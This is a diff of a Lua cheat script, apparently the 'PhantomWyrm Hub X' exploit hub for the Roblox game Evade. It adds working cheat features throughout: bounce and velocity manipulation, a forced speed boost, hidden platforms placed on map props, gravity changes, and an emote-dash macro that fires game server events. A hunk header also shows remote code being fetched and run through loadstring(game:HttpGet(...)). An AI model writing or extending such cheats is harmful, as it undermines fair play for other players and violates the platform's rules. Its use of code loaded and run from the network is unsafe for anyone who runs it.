@@ -5,7 +5,7 @@ local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.
 
 if not Fluent or not SaveManager or not InterfaceManager or not FBM then return game.Players.LocalPlayer:Kick("Error: Interface didn't load") end
 
-if _G.PhantomWyrmHubXIsAlreadyRunning then
+if _G.PhantomWyrmXIsAlreadyRunning then
    game:GetService("StarterGui"):SetCore("SendNotification", {
         Title = "Script is already running!",
         Text = ""
@@ -13,7 +13,7 @@ if _G.PhantomWyrmHubXIsAlreadyRunning then
    return
 end
 
-_G.PhantomWyrmHubXIsAlreadyRunning = true
+_G.PhantomWyrmXIsAlreadyRunning = true
 
 local Window = Fluent:CreateWindow({
     Title = "PhantomWyrm Hub X - Evade Overhaul│PC",
@@ -2027,6 +2027,9 @@ function DFunctions.InfiniteSlideFunction()
 	end
 end
 
+local isHolding = false
+
+
 function DFunctions.BHOPFunction()
     local speedometer = DFunctions.GetSpeedometer()
     local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
@@ -3591,14 +3594,46 @@ local Dropdown = Tabs.Misc:AddDropdown("LagMode", {
         DConfiguration.Misc.Utilities.LagSwitch.Mode = Value
     end)
 
-Tabs.Misc:AddParagraph({
-        Title = " ",
-        Content = ""
-    })
+Tabs.Misc:AddSection("Bouce Adjustments")
     
-local Toggle = Tabs.Misc:AddToggle("AdjustBounce", {Title = "Modify Bounce", Default = false })
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 
-Toggle:OnChanged(function(State)
+_SB = _SB or { Power = 100 }
+DConfiguration = DConfiguration or { Settings = { GuiScale = { BounceBot = 0 } } }
+DFunctions = DFunctions or {}
+
+local function TriggerBounce()
+    local character = LocalPlayer.Character
+    local rootPart = character and character:FindFirstChild("HumanoidRootPart")
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+    
+    if rootPart and humanoid then
+        local raycastParams = RaycastParams.new()
+        raycastParams.FilterType = Enum.RaycastFilterType.Exclude
+        raycastParams.FilterDescendantsInstances = {character}
+        raycastParams.IgnoreWater = true
+        
+        local rayResult = workspace:Raycast(rootPart.Position, Vector3.new(0, -100, 0), raycastParams)
+        
+        if rayResult and rayResult.Instance and rayResult.Instance:IsA("BasePart") and rayResult.Instance.CanCollide then
+            local safePower = math.clamp(_SB.Power, 0, 500)
+            
+            humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+            rootPart.AssemblyLinearVelocity = Vector3.new(rootPart.AssemblyLinearVelocity.X, safePower, rootPart.AssemblyLinearVelocity.Z)
+            
+            task.defer(function()
+                if humanoid then
+                    humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
+                end
+            end)
+        end
+    end
+end
+    
+local ToggleModify = Tabs.Misc:AddToggle("AdjustBounce", {Title = "Modify Bounce", Default = false })
+
+ToggleModify:OnChanged(function(State)
     DConfiguration.Misc.Utilities.BounceModification.Enabled = State
      
     while DConfiguration.Misc.Utilities.BounceModification.Enabled and wait(0.1) do
@@ -3606,9 +3641,36 @@ Toggle:OnChanged(function(State)
     end
 end)
 
-local Toggle = Tabs.Misc:AddToggle("SuperBounce", {Title = "Super Bounce", Default = false})
+Tabs.Misc:AddInput("PlayerBounce", {
+    Title = "Player Bounce",
+    Default = "80",
+    Placeholder = "Bounce Number",
+    Numeric = false,
+    Finished = false, 
+    Callback = function(Value)
+        DConfiguration.Misc.Utilities.BounceModification.DefaultBounce = tonumber(Value) or 80
+    end
+})
+    
+Tabs.Misc:AddInput("EmoteBounce", {
+    Title = "Emote Bounce",
+    Default = "120",
+    Placeholder = "Bounce Number",
+    Numeric = false, 
+    Finished = false, 
+    Callback = function(Value)
+        DConfiguration.Misc.Utilities.BounceModification.EmoteBounce = tonumber(Value) or 120
+    end
+})
 
-Toggle:OnChanged(function(State)
+Tabs.Misc:AddParagraph({
+        Title = " ",
+        Content = ""
+    })
+
+local ToggleSuper = Tabs.Misc:AddToggle("SuperBounce", {Title = "Super Bounce", Default = false})
+
+ToggleSuper:OnChanged(function(State)
     if State then
         DFunctions.CreateButton("SuperBounceButton", "Super Bounce", 0.1 + DConfiguration.Settings.GuiScale.SuperBounce, 0.1 + DConfiguration.Settings.GuiScale.SuperBounce, function(btn)
            DFunctions.SuperBounce()
@@ -3621,28 +3683,81 @@ Toggle:OnChanged(function(State)
     end
 end)
 
- Tabs.Misc:AddInput("PlayerBounce", {
-        Title = "Player Bounce",
-        Default = "80",
-        Placeholder = "Bounce Number",
-        Numeric = false,
-        Finished = false, 
-        Callback = function(Value)
-            DConfiguration.Misc.Utilities.BounceModification.DefaultBounce = tonumber(Value) or 80
+Tabs.Misc:AddInput("SuperBounceSize", {
+    Title = "Super Bounce Size",
+    Default = tostring(DConfiguration.Settings.GuiScale.SuperBounce),
+    Placeholder = "0",
+    Numeric = true,
+    Finished = false,
+    Callback = function(Value)
+        local num = tonumber(Value)
+        if num then
+            local safeSize = math.clamp(num * 0.01, 0, 2)
+            DConfiguration.Settings.GuiScale.SuperBounce = safeSize
+        else
+            DConfiguration.Settings.GuiScale.SuperBounce = 0
         end
-    })
-    
- Tabs.Misc:AddInput("EmoteBounce", {
-        Title = "Emote Bounce",
-        Default = "120",
-        Placeholder = "Bounce Number",
-        Numeric = false, 
-        Finished = false, 
-        Callback = function(Value)
-            DConfiguration.Misc.Utilities.BounceModification.EmoteBounce = tonumber(Value) or 120
+        DFunctions.UpdateButton("SuperBounceButton", 0.1 + DConfiguration.Settings.GuiScale.SuperBounce, 0.1 + DConfiguration.Settings.GuiScale.SuperBounce)
+    end
+})
+
+local ToggleRegular = Tabs.Misc:AddToggle("BounceBtnShow", {
+    Title = "Bounce (Button)", 
+    Description = "",
+    Default = false
+})
+
+ToggleRegular:OnChanged(function(S)
+    if S then
+        local sizeOffset = DConfiguration.Settings.GuiScale.BounceBot or 0
+        
+        DFunctions.CreateButton("BounceBtn", "Rebound", 0.15 + sizeOffset, 0.1 + sizeOffset, function(btn)
+            TriggerBounce()
+        end)
+    else
+        DFunctions.DestroyButton("BounceBtn")
+    end
+end)
+
+Tabs.Misc:AddInput("BouncePowerInput", {
+    Title = "Bounce Power",
+    Default = tostring(_SB.Power or 100),
+    Placeholder = "100",
+    Numeric = true,
+    Finished = false,
+    Callback = function(Value)
+        local num = tonumber(Value)
+        if num then
+            _SB.Power = math.clamp(num, 0, 500)
+        else
+            _SB.Power = 100
         end
-    })
-    
+    end
+})
+
+local currentSize = DConfiguration.Settings.GuiScale.BounceBot
+if not currentSize or tostring(currentSize) == "nil" or currentSize == "" then
+    DConfiguration.Settings.GuiScale.BounceBot = 0
+end
+
+Tabs.Misc:AddInput("BounceBtnSize", {
+    Title = "Bounce Size Button",
+    Default = tostring(DConfiguration.Settings.GuiScale.BounceBot),
+    Placeholder = "0",
+    Numeric = true,
+    Finished = false,
+    Callback = function(Value)
+        local num = tonumber(Value)
+        if num then
+            local safeSize = math.clamp(num * 0.01, 0, 2)
+            DConfiguration.Settings.GuiScale.BounceBot = safeSize
+        else
+            DConfiguration.Settings.GuiScale.BounceBot = 0
+        end
+        DFunctions.UpdateButton("BounceBtn", 0.15 + DConfiguration.Settings.GuiScale.BounceBot, 0.1 + DConfiguration.Settings.GuiScale.BounceBot)
+    end
+})
+
 Tabs.Misc:AddParagraph({
         Title = " ",
         Content = ""
@@ -3679,6 +3794,268 @@ Tabs.Misc:AddInput("DownThreshold", {
             DConfiguration.Misc.Utilities.EdgeTrimpModification.DownThreshold = tonumber(Value) or 4.5
         end
     })
+    
+   Tabs.Misc:AddParagraph({
+        Title = " ",
+        Content = ""
+    })
+
+do
+    local PlatData = {
+        Enabled = false,
+        Size = 10,
+        Transparency = 0.1,
+        List = {}
+    }
+
+    local function ClearPlates()
+        for _, p in pairs(PlatData.List) do
+            if p and p.Parent then p:Destroy() end
+        end
+        PlatData.List = {}
+    end
+
+    local function GetFolder()
+        local g = workspace:FindFirstChild("Game")
+        local m = g and g:FindFirstChild("Map")
+        local p = m and m:FindFirstChild("Parts")
+        return p and p:FindFirstChild("ImmovableProps")
+    end
+
+    local function CreatePlates()
+        ClearPlates()
+        if not PlatData.Enabled then return end
+        local folder = GetFolder()
+        if not folder then return end
+        
+        for _, obj in pairs(folder:GetChildren()) do
+            if obj.Name == "Cactus1" or obj.Name == "Cactus2" then
+                local pos, size
+                if obj:IsA("Model") then
+                    local cf, s = obj:GetBoundingBox()
+                    pos, size = cf.Position, s
+                elseif obj:IsA("BasePart") then
+                    pos, size = obj.Position, obj.Size
+                end
+
+                if pos and size then
+                    local p = Instance.new("Part")
+                    p.Name = "PhantomWyrm"
+                    p.Size = Vector3.new(PlatData.Size, 1, PlatData.Size)
+                    p.Anchored, p.CanCollide = true, true
+                    p.Material = Enum.Material.Neon
+                    p.Transparency = PlatData.Transparency
+                    p.Color = Color3.fromRGB(0, 255, 150)
+                    p.Position = pos + Vector3.new(0, (size.Y / 2) + 0.5, 0)
+                    p.Parent = workspace
+                    table.insert(PlatData.List, p)
+                end
+            end
+        end
+    end
+
+    Tabs.Misc:AddToggle("CactusToggle", {
+        Title = "Cactus Edge Platform",
+        Default = false,
+        Callback = function(Value)
+            PlatData.Enabled = Value
+            CreatePlates()
+        end
+    })
+
+    Tabs.Misc:AddInput("CactusTransInput", {
+        Title = "Platform Transparency (0-1)",
+        Description = "make platforms invisible 3-5",
+        Default = "0.5",
+        Numeric = true,
+        Finished = true,
+        Callback = function(Value)
+            local num = tonumber(Value) or 0.5
+            PlatData.Transparency = math.clamp(num, 0, 1)
+            for _, p in pairs(PlatData.List) do
+                if p and p.Parent then p.Transparency = PlatData.Transparency end
+            end
+        end
+    })
+
+    Tabs.Misc:AddInput("CactusSizeInput", {
+        Title = "Platform Size",
+        Default = "12",
+        Numeric = true,
+        Finished = true,
+        Callback = function(Value)
+            PlatData.Size = tonumber(Value) or 12
+            if PlatData.Enabled then CreatePlates() end
+        end
+    })
+
+    task.spawn(function()
+        while task.wait(3) do
+            if PlatData.Enabled and #PlatData.List == 0 then
+                CreatePlates()
+            end
+        end
+    end)
+end
+    
+    Tabs.Misc:AddParagraph({
+        Title = " ",
+        Content = ""
+    })
+
+local LP = game.Players.LocalPlayer
+local RS = game:GetService("RunService")
+local Cam = workspace.CurrentCamera
+
+getgenv().EasyBounce = getgenv().EasyBounce or {
+    Enabled = false,
+    Mode = "Forward",
+    BaseSpeed = 50,
+    ExtraSpeed = 100
+}
+
+local EB = getgenv().EasyBounce
+local state = {
+    speed = EB.BaseSpeed,
+    last = tick(),
+    airTick = 0,
+    airSum = 0,
+    airborne = false,
+    bv = nil
+}
+
+local function getMeter()
+    local ok, v = pcall(function()
+        return LP.PlayerGui.Shared.HUD.Overlay.Default.CharacterInfo.Item.Speedometer.Players
+    end)
+    return ok and v or nil
+end
+
+local function cut(n) return math.floor(n * 10) / 10 end
+
+local function resetPhysics(hrp, hum)
+    if state.bv then 
+        state.bv:Destroy() 
+        state.bv = nil 
+    end
+    if hrp then
+        for _, child in ipairs(hrp:GetChildren()) do
+            if (child:IsA("BodyVelocity") and child.Name == "BodyVelocity") or child:IsA("BodyForce") then
+                child:Destroy()
+            end
+        end
+    end
+    state.speed = EB.BaseSpeed
+    state.airTick, state.airSum, state.airborne = 0, 0, false
+end
+
+RS.RenderStepped:Connect(function()
+    local ch = LP.Character
+    local hrp = ch and ch:FindFirstChild("HumanoidRootPart")
+    local hum = ch and ch:FindFirstChild("Humanoid")
+    
+    if _G.Fly or not EB.Enabled then
+        resetPhysics(hrp, hum)
+        return 
+    end
+
+    if not hrp or not hum then return end
+
+    local dt = tick() - state.last
+    state.last = tick()
+
+    local inAir = hum.FloorMaterial == Enum.Material.Air
+    local spdUI = getMeter()
+
+    if state.airborne and not inAir then
+        state.speed = math.max(EB.BaseSpeed, state.speed - 10)
+        if spdUI then spdUI.Text = cut(state.speed) end
+        state.airSum = 0
+    end
+    state.airborne = inAir
+
+    local shouldPush = true
+
+    if shouldPush then
+        if inAir then
+            state.airSum = state.airSum + dt
+            state.airTick = state.airTick + dt
+            while state.airTick >= 0.04 do
+                state.airTick = state.airTick - 0.04
+                state.speed = math.min(EB.BaseSpeed + EB.ExtraSpeed, state.speed + 0.1)
+            end
+        else
+            state.airTick, state.airSum = 0, 0
+            state.speed = math.max(EB.BaseSpeed, state.speed - (2.5 * dt))
+        end
+
+        if not state.bv or state.bv.Parent ~= hrp then
+            if state.bv then state.bv:Destroy() end
+            state.bv = Instance.new("BodyVelocity")
+            state.bv.Parent = hrp
+        end
+        
+        local camDir = Cam.CFrame.LookVector
+        local moveDir = Vector3.new(camDir.X, 0, camDir.Z).Unit
+        
+        if EB.Mode == "Back" then
+            moveDir = -moveDir
+        end
+
+        state.bv.Velocity = moveDir * state.speed
+        state.bv.MaxForce = Vector3.new(4e5, 0, 4e5) 
+
+        if spdUI then spdUI.Text = cut(state.speed) end
+    else
+        if state.bv then
+            state.bv.MaxForce = Vector3.new(0, 0, 0) 
+            state.bv.Velocity = Vector3.new(0, 0, 0)
+        end
+        state.speed = EB.BaseSpeed
+    end
+end)
+
+Tabs.Misc:AddKeybind("EB_ToggleKey", {
+    Title = "Easy Bounce Toggle",
+    Mode = "Toggle",
+    Default = "V",
+    Callback = function(State)
+        EB.Enabled = State
+    end
+})
+
+Tabs.Misc:AddDropdown("EB_ModeDropdown", {
+    Title = "Easy Bounce Mode",
+    Values = {"Forward", "Back"},
+    Default = EB.Mode,
+    Callback = function(v)
+        EB.Mode = v
+    end
+})
+
+Tabs.Misc:AddInput("EB_Base", {
+    Title = "Base Speed", 
+    Default = tostring(EB.BaseSpeed), 
+    Numeric = true, 
+    Finished = true, 
+    Callback = function(v) 
+        EB.BaseSpeed = tonumber(v) or 50 
+        if getgenv().UpdateBounceSpeed then
+            getgenv().UpdateBounceSpeed(EB.BaseSpeed)
+        end
+    end
+})
+
+Tabs.Misc:AddInput("EB_Extra", {
+    Title = "Extra Speed (Boost)", 
+    Default = tostring(EB.ExtraSpeed), 
+    Numeric = true, 
+    Finished = true, 
+    Callback = function(v) 
+        EB.ExtraSpeed = tonumber(v) or 100 
+    end
+})
+
     
 Tabs.Misc:AddSection("Camera Adjustments")
 
@@ -3926,19 +4303,6 @@ Tabs.Misc:AddButton({
     
 Tabs.Misc:AddSection("Game Automations")
 
-local Toggle = Tabs.Misc:AddToggle("InstantReviveButton", {Title = "Instant Revive (Button)", Default = false})
-
-Toggle:OnChanged(function(State)
-    if State then
-          DFunctions.CreateButton("InstantReviveButton", "Instant Revive: OFF", 0.15 + DConfiguration.Settings.GuiScale.InstantRevive, 0.1 + DConfiguration.Settings.GuiScale.InstantRevive, function(btn)
-         	DConfiguration.Misc.GameAutomation.Revive.FloatingButton = not DConfiguration.Misc.GameAutomation.Revive.FloatingButton
-             btn.Text = DConfiguration.Misc.GameAutomation.Revive.FloatingButton and "Instant Revive: ON" or "Instant Revive: OFF"
-          end)
-     else
-         DFunctions.DestroyButton("InstantReviveButton")
-     end
-end)
-
 local Toggle = Tabs.Misc:AddToggle("InstantRevive", {Title = "Instant Revive", Default = false})
 
 Toggle:OnChanged(function(State)
@@ -3980,42 +4344,11 @@ local Keybind = Tabs.Misc:AddKeybind("KeybindRevive", {
         DConfiguration.Misc.GameAutomation.Revive.Keybind = Bool
    end,
     })
-
-Tabs.Misc:AddInput("InstantReviveButtonSize", {
-    Title = "Instant Revive Gui Size",
-    Default = tostring(DConfiguration.Settings.GuiScale.InstantRevive),
-    Placeholder = "0",
-    Numeric = true, 
-    Finished = false, 
-    Callback = function(Value)
-        local num = tonumber(Value)
-        if num then
-            DConfiguration.Settings.GuiScale.InstantRevive = num * 0.01
-        else
-            DConfiguration.Settings.GuiScale.InstantRevive = 0
-        end
-        
-        DFunctions.UpdateButton("InstantReviveButton", 0.15 + DConfiguration.Settings.GuiScale.InstantRevive, 0.1 + DConfiguration.Settings.GuiScale.InstantRevive)
-    end
-})
     
 Tabs.Misc:AddParagraph({
         Title = " ",
         Content = ""
     })
-    
-local Toggle = Tabs.Misc:AddToggle("AutoCarry", {Title = "Auto Carry (Button)", Default = false})
-
-Toggle:OnChanged(function(State)
-    if State then
-      DFunctions.CreateButton("AutoCarryGui", "Auto Carry: OFF", 0.15 + DConfiguration.Settings.GuiScale.AutoCarry, 0.1 + DConfiguration.Settings.GuiScale.AutoCarry, function(btn)
-      	DConfiguration.Misc.GameAutomation.Carry.FloatingButton = not DConfiguration.Misc.GameAutomation.Carry.FloatingButton
-          btn.Text = DConfiguration.Misc.GameAutomation.Carry.FloatingButton and "Auto Carry: ON" or "Auto Carry: OFF"
-       end)
-  else
-      DFunctions.DestroyButton("AutoCarryGui")
-    end
-end)
 
 local Toggle = Tabs.Misc:AddToggle("EmoteCarry", {Title = "Carry While Emote", Default = false})
 
@@ -4033,24 +4366,6 @@ local Keybind = Tabs.Misc:AddKeybind("KeybindCarry", {
    end,
 })
 
-Tabs.Misc:AddInput("CarryButtonSize", {
-    Title = "Auto Carry Gui Size",
-    Default = tostring(DConfiguration.Settings.GuiScale.AutoCarry),
-    Placeholder = "0",
-    Numeric = true, 
-    Finished = false, 
-    Callback = function(Value)
-        local num = tonumber(Value)
-        if num then
-            DConfiguration.Settings.GuiScale.AutoCarry = num * 0.01
-        else
-            DConfiguration.Settings.GuiScale.AutoCarry = 0
-        end
-        
-        DFunctions.UpdateButton("AutoCarryGui", 0.15 + DConfiguration.Settings.GuiScale.AutoCarry, 0.1 + DConfiguration.Settings.GuiScale.AutoCarry)
-    end
-})
-
 Tabs.Misc:AddParagraph({
         Title = " ",
         Content = ""
@@ -4058,68 +4373,57 @@ Tabs.Misc:AddParagraph({
 
 wait(Duration)
 
-local Toggle = Tabs.Misc:AddToggle("AutoEmote", {Title = "Auto Emote Dash Button", Default = false})
+local SelectedCrouchMode = "Crouch"
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = game:GetService("Players").LocalPlayer
 
-Toggle:OnChanged(function(State)
-    if State then
-      DFunctions.CreateButton("EmoteDashButton", "Start Emote", 0.15 + DConfiguration.Settings.GuiScale.AutoEmoteDash, 0.1 + DConfiguration.Settings.GuiScale.AutoEmoteDash, function(btn)
-           btn.Text = "Emoting..."
-           ReplicatedStorage.Events.Character.Emote:FireServer(DConfiguration.Misc.GameAutomation.Macro.SelectedEmote)
-           wait(0.1)
-           btn.Text = "Crouching..."
-           LocalPlayer.PlayerScripts.Events.temporary_events.UseKeybind:Fire({ ["Key"] = "Crouch", ["Down"] = true })
-           wait(0.1)
-           btn.Text = "Start Emote"
-       end)
-    else
-        DFunctions.DestroyButton("EmoteDashButton")
-    end
-end)
-
-Tabs.Misc:AddInput("EmoteButtonSize", {
-    Title = "Auto Emote Dash Gui Size",
-    Default = tostring(DConfiguration.Settings.GuiScale.AutoEmoteDash),
-    Placeholder = "0",
-    Numeric = true, 
-    Finished = false, 
+Tabs.Misc:AddDropdown("EmoteCrouchSettings", {
+    Title = "Crouch Setting",
+    Values = {"Crouch", "Don't Crouch"},
+    Multi = false,
+    Default = "Crouch",
     Callback = function(Value)
-        local num = tonumber(Value)
-        if num then
-            DConfiguration.Settings.GuiScale.AutoEmoteDash = num * 0.01
-        else
-            DConfiguration.Settings.GuiScale.AutoEmoteDash = 0
-        end
-        
-        DFunctions.UpdateButton("EmoteDashButton", 0.15 + DConfiguration.Settings.GuiScale.AutoEmoteDash, 0.1 + DConfiguration.Settings.GuiScale.AutoEmoteDash)
+        SelectedCrouchMode = Value
     end
 })
 
-local Keybind = Tabs.Misc:AddKeybind("KeyEmoteDash", {
-        Title = "Keybind to Emote Dash",
-        Mode = "Toggle", 
-        Default = "RightControl",
-        
-        Callback = function(Bool)
-        DConfiguration.Misc.GameAutomation.Macro.Keybind = Bool
-        
-        if DConfiguration.Misc.GameAutomation.Macro.Keybind then
-           ReplicatedStorage.Events.Character.Emote:FireServer(DConfiguration.Misc.GameAutomation.SelectedEmote)
-           wait(0.1)
-           LocalPlayer.PlayerScripts.Events.temporary_events.UseKeybind:Fire({ ["Key"] = "Crouch", ["Down"] = true })
+Tabs.Misc:AddKeybind("KeyEmoteDash", {
+    Title = "Keybind to Emote Dash",
+    Mode = "Toggle", 
+    Default = "RightControl",
+    Callback = function(State)
+        if State then
+            task.spawn(function()
+                local EmoteEvent = ReplicatedStorage:FindFirstChild("Events") and ReplicatedStorage.Events:FindFirstChild("Character") and ReplicatedStorage.Events.Character:FindFirstChild("Emote")
+                
+                if EmoteEvent then
+                    EmoteEvent:FireServer(DConfiguration.Misc.GameAutomation.Macro.SelectedEmote)
+                end
+                
+                task.wait(0.1)
+                
+                if SelectedCrouchMode == "Crouch" then
+                    local UseKeybind = LocalPlayer:FindFirstChild("PlayerScripts") and LocalPlayer.PlayerScripts:FindFirstChild("Events", true) and LocalPlayer.PlayerScripts.Events.temporary_events.UseKeybind
+                    if UseKeybind then
+                        UseKeybind:Fire({ ["Key"] = "Crouch", ["Down"] = true })
+                    end
+                end
+            end)
         end
-   end,
-    })
-    
-local Dropdown = Tabs.Misc:AddDropdown("EmoteID", {
-        Title = "Select Emote ID",
-        Values = EmoteNames,
-        Multi = false,
-        Default = 1,
-    })
+    end
+})
 
-    Dropdown:OnChanged(function(Value)
-        DConfiguration.Misc.GameAutomation.Macro.SelectedEmote = Value
-    end)
+local Dropdown = Tabs.Misc:AddDropdown("EmoteID", {
+    Title = "Select Emote ID",
+    Values = EmoteNames,
+    Multi = false,
+    Default = 1,
+})
+
+Dropdown:OnChanged(function(Value)
+    DConfiguration.Misc.GameAutomation.Macro.SelectedEmote = Value
+end)
+
 
 Tabs.Misc:AddSection("Movement Modification")
 
@@ -4184,46 +4488,6 @@ Toggle:OnChanged(function(State)
     end
 end)
 
-local Toggle = Tabs.Misc:AddToggle("InfiniteSlideButton", {Title = "Infinite Slide (Button)", Default = false })
-
-Toggle:OnChanged(function(State)
-    if State then
-        DFunctions.CreateButton("InfiniteSlideButton", "Infinite Slide: OFF", 0.15 + DConfiguration.Settings.GuiScale.InfiniteSlide, 0.1 + DConfiguration.Settings.GuiScale.InfiniteSlide, function(btn)
-            DConfiguration.Misc.MovementModification.SlideModification.FloatingButton = not DConfiguration.Misc.MovementModification.SlideModification.FloatingButton
-            btn.Text = DConfiguration.Misc.MovementModification.SlideModification.FloatingButton and "Infinite Slide: ON" or "Infinite Slide: OFF"
-            DConfiguration.Misc.MovementModification.SlideModification.Enabled = DConfiguration.Misc.MovementModification.SlideModification.FloatingButton
-            
-            if not DConfiguration.Misc.MovementModification.SlideModification.FloatingButton then
-                DConfiguration.Misc.PlayerAdjustment.Update.GroundAcceleration = 5
-                wait(0.1)
-                DConfiguration.Misc.PlayerAdjustment.Update.GroundAcceleration = 5
-            end
-        end)
-    else
-        DConfiguration.Misc.PlayerAdjustment.Update.GroundAcceleration = 5
-        wait(0.1)
-        DFunctions.DestroyButton("InfiniteSlideButton")
-    end
-end)
-
-Tabs.Misc:AddInput("InfiniteSlideButtonSize", {
-    Title = "Infinite Slide Gui Size",
-    Default = tostring(DConfiguration.Settings.GuiScale.InfiniteSlide),
-    Placeholder = "0",
-    Numeric = true, 
-    Finished = false, 
-    Callback = function(Value)
-        local num = tonumber(Value)
-        if num then
-            DConfiguration.Settings.GuiScale.InfiniteSlide = num * 0.01
-        else
-            DConfiguration.Settings.GuiScale.InfiniteSlide = 0
-        end
-        
-        DFunctions.UpdateButton("InfiniteSlideButton", 0.15 + DConfiguration.Settings.GuiScale.InfiniteSlide, 0.1 + DConfiguration.Settings.GuiScale.InfiniteSlide)
-    end
-})
-
  Tabs.Misc:AddInput("CrouchSpeed", {
         Title = "Slide Speed (Negative Only)",
         Default = "-3",
@@ -4239,171 +4503,74 @@ Tabs.Misc:AddInput("InfiniteSlideButtonSize", {
         Title = " ",
         Content = ""
     })
+    
+local NormalGravity = workspace.Gravity
 
-local NormalGravity = game.Workspace.Gravity
-
-local Toggle = Tabs.Misc:AddToggle("GravityToggle", {Title = "Gravity Button", Default = false })
-
-    Toggle:OnChanged(function(State)
-      if State then
-          DFunctions.CreateButton("GravityGui", "Gravity: OFF", 0.15 + DConfiguration.Settings.GuiScale.Gravity, 0.1 + DConfiguration.Settings.GuiScale.Gravity, function(btn)
-         	DConfiguration.Misc.MovementModification.Gravity.FloatingButton = not DConfiguration.Misc.MovementModification.Gravity.FloatingButton
-             btn.Text = DConfiguration.Misc.MovementModification.Gravity.FloatingButton and "Gravity: ON" or "Gravity: OFF"
-          end)
-     else
-         DFunctions.DestroyButton("GravityGui")
-     end
-end)
-
-Tabs.Misc:AddInput("GravityButtonSize", {
-    Title = "Gravity Gui Size",
-    Default = tostring(DConfiguration.Settings.GuiScale.Gravity),
-    Placeholder = "0",
-    Numeric = true, 
-    Finished = false, 
-    Callback = function(Value)
-        local num = tonumber(Value)
-        if num then
-            DConfiguration.Settings.GuiScale.Gravity = num * 0.01
-        else
-            DConfiguration.Settings.GuiScale.Gravity = 0
-        end
+Tabs.Misc:AddToggle("GravityToggle", {
+    Title = "Gravity Toggle",
+    Default = false,
+    Callback = function(State)
+        DConfiguration.Misc.MovementModification.Gravity.Keybind = State
         
-        DFunctions.UpdateButton("GravityGui", 0.15 + DConfiguration.Settings.GuiScale.Gravity, 0.1 + DConfiguration.Settings.GuiScale.Gravity)
+        if State then
+            workspace.Gravity = DConfiguration.Misc.MovementModification.Gravity.Value
+        else
+            workspace.Gravity = NormalGravity
+        end
     end
 })
 
-local Keybind = Tabs.Misc:AddKeybind("GravitKey", {
-        Title = "Gravity Keybind",
-        Mode = "Toggle", 
-        Default = "J",
+Tabs.Misc:AddInput("GravityAdjust", {
+    Title = "Gravity Adjustment",
+    Default = "10",
+    Placeholder = "Number",
+    Numeric = true,
+    Finished = false,
+    Callback = function(Value)
+        local num = tonumber(Value) or 10
+        DConfiguration.Misc.MovementModification.Gravity.Value = num
         
-        Callback = function(Bool)
-	        DConfiguration.Misc.MovementModification.Gravity.Keybind = Bool
-        end,
-    })
-    
- Tabs.Misc:AddInput("GravityAdjust", {
-        Title = "Gravity Adjustment",
-        Default = "10",
-        Placeholder = " Number",
-        Numeric = false, 
-        Finished = false, 
-        Callback = function(Value)
-            DConfiguration.Misc.MovementModification.Gravity.Value = tonumber(Value) or  10
+        if DConfiguration.Misc.MovementModification.Gravity.Keybind then
+            workspace.Gravity = num
         end
-    })
+    end
+})
+
     
 Tabs.Misc:AddParagraph({
         Title = " ",
         Content = ""
     })
-    
-local Toggle = Tabs.Misc:AddToggle("BHOPToggle", {Title = "BHOP (Button)", Default = false })
 
-    Toggle:OnChanged(function(State)
-       
-       if State then
-          DFunctions.CreateButton("BHOPGui", "Auto Jump: OFF", 0.15 + DConfiguration.Settings.GuiScale.AutoJump, 0.1 + DConfiguration.Settings.GuiScale.AutoJump, function(btn)
-         	DConfiguration.Misc.MovementModification.BHOP.FloatingButton = not DConfiguration.Misc.MovementModification.BHOP.FloatingButton
-             btn.Text = DConfiguration.Misc.MovementModification.BHOP.FloatingButton and "Auto Jump: ON" or "Auto Jump: OFF"
-             
-             while DConfiguration.Misc.MovementModification.BHOP.FloatingButton and wait(0.1) do
-                 DConfiguration.Misc.MovementModification.BHOP.Enabled = DConfiguration.Misc.MovementModification.BHOP.FloatingButton
-             end
-             
-             if not DConfiguration.Misc.MovementModification.BHOP.FloatingButton then          
-              spawn(DFunctions.ResetBHOP)
-              wait(0.1)
-              spawn(DFunctions.ResetBHOP)
-              DConfiguration.Misc.MovementModification.BHOP.Enabled = false
-          end
-      end)
-   else
-      DFunctions.DestroyButton("BHOPGui")
-     end
-end)
+local isHolding = false
 
-local Toggle = Tabs.Misc:AddToggle("BHOPJumpButton", {Title = "BHOP (Jump Button)", Default = false })
-
- Toggle:OnChanged(function(State)
-      DConfiguration.Misc.MovementModification.BHOP.JumpButton = State
-end)
-
-if UserInputService.TouchEnabled then
-    local JumpButton = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TouchGui"):WaitForChild("TouchControlFrame"):FindFirstChild("JumpButton")
-    
-    if JumpButton then
-        local isJumping = false
-
-        JumpButton.InputBegan:Connect(function(input)
-            if input.UserInputType == Enum.UserInputType.Touch and DConfiguration.Misc.MovementModification.BHOP.JumpButton then
-                if not isJumping then
-                    isJumping = true
-                    DConfiguration.Misc.MovementModification.BHOP.Enabled = true
-                end
-            end
-        end)
-
-        JumpButton.InputEnded:Connect(function(input)
-            if input.UserInputType == Enum.UserInputType.Touch and DConfiguration.Misc.MovementModification.BHOP.JumpButton and not DConfiguration.Misc.MovementModification.BHOP.FloatingButton then
-                if isJumping then
-                    isJumping = false
-                    DConfiguration.Misc.MovementModification.BHOP.Enabled = false
-                    spawn(DFunctions.ResetBHOP)
-                    wait(0.1)
-                    spawn(DFunctions.ResetBHOP)
-                end
-            end
-        end)
-    end
-end
-
-local Keybind = Tabs.Misc:AddKeybind("KeybindBHOP", {
-        Title = "Keybind to BHOP",
-        Mode = "Toggle", 
-        Default = "B",
-        
-        Callback = function(Bool)
-        DConfiguration.Misc.MovementModification.BHOP.Keybind = Bool
-        
-        if not DConfiguration.Misc.MovementModification.BHOP.Keybind then         
-           spawn(DFunctions.ResetBHOP)
+Tabs.Misc:AddKeybind("KeybindBHOP", {
+    Title = "Toggle BHOP",
+    Mode = "Toggle", 
+    Default = "B",
+    Callback = function(State)        
+        DConfiguration.Misc.MovementModification.BHOP.Enabled = State or isHolding        
+        if not State and not isHolding then
+            task.spawn(DFunctions.ResetBHOP)
         end
-   end,
-    })
-    
-local Keybind = Tabs.Misc:AddKeybind("KeybindBHOP2", {
-        Title = "Keybind to BHOP (Hold)",
-        Mode = "Hold", 
-        Default = "Space",
-        
-        Callback = function(Bool)
